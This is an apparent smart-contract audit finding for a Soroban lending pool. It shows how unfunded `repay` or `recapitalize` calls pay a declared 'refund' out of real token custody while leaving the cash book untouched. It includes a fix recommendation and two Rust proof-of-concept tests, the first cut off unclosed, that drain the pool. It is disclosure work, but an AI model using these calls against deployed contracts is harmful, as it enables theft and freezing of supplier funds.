### Title
Unverified-refund ordering lets any caller drain pool custody via `repay`/`recapitalize` - (File: contracts/pool/src/ops/repay.rs)

### Summary
CVE-2021-46944 is a leak caused by performing the validity check after the resource is committed — the fix was reordering the check before the allocation. The same shape exists in the pool contract: `ops::repay::apply` and `ops::recapitalize::apply` pay out a "refund" of the excess over the debt/shortfall to the declared `payer` from real token custody, while the only thing that ever proved a payment happened is the caller-supplied `amount` argument. The refund is committed before — and without — any verification that funds were actually received, so the paid-out tokens are permanently lost from custody while the `cash` book is untouched.

### Finding Description
In `contracts/pool/src/ops/repay.rs`, `apply` computes `overpayment = amount - net_repay` purely from the declared `action.amount` and outstanding debt, then calls `outcome.cache.transfer_out(payer, outcome.overpayment)` at line 32. Nothing checks that the pool's token balance actually increased by `amount`. On a market with zero debt, `resolve_repay` takes the full-close branch: `net_repay == 0`, the `RepayRoundsToZeroShares` assert passes on its `net_repay == 0` disjunct (lines 48–52), and the entire declared `amount` becomes a refundable "overpayment" paid out of real custody.

`contracts/pool/src/ops/recapitalize.rs` has the identical shape: `applied = amount.min(backing_shortfall)` (line 52), `refund = amount - applied` (line 53), and `transfer_out(&payer, refund)` at line 34 — again with no check that `amount` was ever transferred in. On a solvent market the shortfall is 0, so `applied = 0` and the whole `amount` is refunded.

The pinned tests confirm reachability and effect: `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` drains the pool's entire token custody with a single unfunded `recapitalize` call, and `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` does the same through `repay` on a zero-debt market (`contracts/pool/tests/flows.rs` lines 3407–3483, 3578–3611). Both assert the `cash` book is left unchanged, so `require_reserves` still reports the market liquid while custody is gone.

### Impact Explanation
Direct theft of user funds. A single unprivileged call to `pool.recapitalize` or `pool.repay` with `payer = attacker` and `amount = pool_balance` transfers the pool's entire token custody to the attacker — no inbound transfer is required because the refund is derived from the declared amount, not a measured balance delta. Worse, the theft is masked: `cash` is never debited, so the pool's own liquidity and solvency guards keep reporting the stolen funds as present. Subsequent honest withdrawals pass `require_reserves` on the inflated book and then revert inside the SAC transfer, permanently freezing supplier funds as well (confirmed by the test asserting the withdraw fails with the SAC `BalanceError = 10`, not a pool guard).

### Likelihood Explanation
Permissionless and repeatable. Both entrypoints are in the allowed surface (`repay` via controller flow, `recapitalize` directly, and the pool leg itself as demonstrated by the tests), require no collateral, no position, no price condition, and work on any listed market — solvent (via `recapitalize`, where the whole amount is "excess") or debt-free (via `repay`, where the whole amount is "overpayment"). Cost is one contract call per market.

### Recommendation
Measure rather than declare. Either (a) gate these pool entrypoints to the controller and have the controller perform the inbound transfer in the same transaction before invoking the pool op, or (b) make the refund conditional on a balance-delta measurement: snapshot the token balance, require `received = balance_after - balance_before >= amount`, and cap `refund` at `received - applied`. Apply the same fix to both `repay` and `recapitalize` — the test file notes the gap is shared. Alternatively, debit `cash` by the refunded amount and route refunds through `require_reserves`, though that still permits theft of un-backed custody; inbound measurement is the correct ordering, matching the kernel fix of checking before committing the resource.

#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );

/// The refund gap is not specific to `recapitalize`. Two pool legs refund an
/// excess derived from a declared inbound amount, not from the cash book:
/// `ops::recapitalize::apply` (the excess over the shortfall) and
/// `ops::repay::apply` (the excess over the debt). Neither refund debits `cash`
/// or passes `require_reserves`.
///
/// A repay against a market with no debt makes the entire declared amount an
/// overpayment: `current_debt_ceil` is zero, so `resolve_repay` takes the
/// full-close branch and `net_repay` is zero. The `RepayRoundsToZeroShares`
/// assert in `ops::repay::accounting` passes on its `net_repay == 0` disjunct,
/// and the whole amount is refunded out of real custody with the book untouched.
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
